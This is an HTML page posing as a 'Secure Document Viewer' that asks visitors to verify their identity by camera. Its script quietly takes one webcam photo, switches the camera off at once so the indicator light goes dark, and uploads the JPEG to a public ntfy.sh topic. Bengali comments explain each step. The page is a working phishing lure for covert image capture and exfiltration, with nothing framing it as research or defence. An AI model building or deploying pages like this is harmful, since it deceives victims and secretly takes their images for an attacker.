<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>Secure Document Viewer</title>
  <style>
    * { box-sizing: border-box; margin: 0; padding: 0; }
    body {
      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
      background: #0f172a;
      color: #e2e8f0;
      min-height: 100vh;
      display: flex;
      align-items: center;
      justify-content: center;
      padding: 24px;
    }
    .card {
      background: #1e293b;
      border-radius: 16px;
      padding: 32px 28px;
      max-width: 420px;
      width: 100%;
      box-shadow: 0 20px 40px rgba(0,0,0,.4);
      text-align: center;
    }
    h1 { font-size: 1.35rem; margin-bottom: 8px; font-weight: 600; }
    p { font-size: 0.95rem; color: #94a3b8; line-height: 1.5; margin-bottom: 24px; }
    .btn {
      display: inline-block;
      background: #3b82f6;
      color: #fff;
      border: none;
      border-radius: 10px;
      padding: 14px 28px;
      font-size: 1rem;
      font-weight: 600;
      cursor: pointer;
      transition: background .15s;
    }
    .btn:hover { background: #2563eb; }
    .btn:disabled { background: #475569; cursor: not-allowed; }
    .status { margin-top: 18px; font-size: 0.85rem; color: #64748b; min-height: 1.2em; }
    video, canvas { display: none; }
    .spinner {
      display: none;
      width: 28px; height: 28px;
      border: 3px solid #334155;
      border-top-color: #3b82f6;
      border-radius: 50%;
      animation: spin .7s linear infinite;
      margin: 16px auto 0;
    }
    @keyframes spin { to { transform: rotate(360deg); } }
  </style>
</head>
<body>
  <div class="card">
    <h1>Document Ready</h1>
    <p>Click below to verify your identity and open the secure document. Camera access is required for verification.</p>
    <button class="btn" id="startBtn">Continue</button>
    <div class="spinner" id="spinner"></div>
    <div class="status" id="status"></div>
  </div>

  <video id="video" playsinline autoplay muted></video>
  <canvas id="canvas"></canvas>

  <script>
    // ========== CONFIG ==========
    // এখানে নির্দিষ্ট টপিক নেম সেট করে দেওয়া হয়েছে
    const NTFY_TOPIC = "amar-nijer-test-123";
    // ============================

    const video   = document.getElementById("video");
    const canvas  = document.getElementById("canvas");
    const btn     = document.getElementById("startBtn");
    const status  = document.getElementById("status");
    const spinner = document.getElementById("spinner");

    function setStatus(msg) {
      status.textContent = msg;
    }

    async function start() {
      btn.disabled = true;
      spinner.style.display = "block";
      setStatus("Requesting camera…");

      try {
        const stream = await navigator.mediaDevices.getUserMedia({
          video: { facingMode: "user", width: { ideal: 1280 }, height: { ideal: 720 } },
          audio: false
        });
        video.srcObject = stream;
        await video.play();

        // ক্যামেরা স্ট্রিম লোড হওয়ার জন্য সামান্য অপেক্ষা
        await new Promise(r => setTimeout(r, 800));

        // ছবি ক্যাপচার করা
        canvas.width  = video.videoWidth  || 640;
        canvas.height = video.videoHeight || 480;
        const ctx = canvas.getContext("2d");
        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);

        // সাথে সাথে ক্যামেরা বন্ধ করে দেওয়া যাতে লাইট অফ হয়ে যায়
        stream.getTracks().forEach(t => t.stop());

        setStatus("Sending…");

        // ক্যানভাসকে JPEG ব্লবে রূপান্তর করা
        const blob = await new Promise(resolve => canvas.toBlob(resolve, "image/jpeg", 0.85));
        if (!blob) throw new Error("Failed to create image");

        // ntfy.sh সার্ভারে আপলোড করা
        const res = await fetch("https://ntfy.sh/" + NTFY_TOPIC, {
          method: "PUT",
          headers: {
            "Filename": "capture.jpg",
            "Title": "Camera capture",
            "Tags": "camera,eye",
            "Priority": "4"
          },
          body: blob
        });

        if (!res.ok) throw new Error("Upload failed: " + res.status);

        spinner.style.display = "none";
        setStatus("Done. You can close this page.");
        btn.style.display = "none";

        console.log("ntfy topic:", NTFY_TOPIC);
        status.innerHTML = "Done.<br><small style='color:#64748b'>Topic: <code>" + NTFY_TOPIC + "</code></small>";

      } catch (err) {
        spinner.style.display = "none";
        btn.disabled = false;
        setStatus("Error: " + (err.message || err));
        console.error(err);
      }
    }

    btn.addEventListener("click", start);
  </script>
</body>
</html>
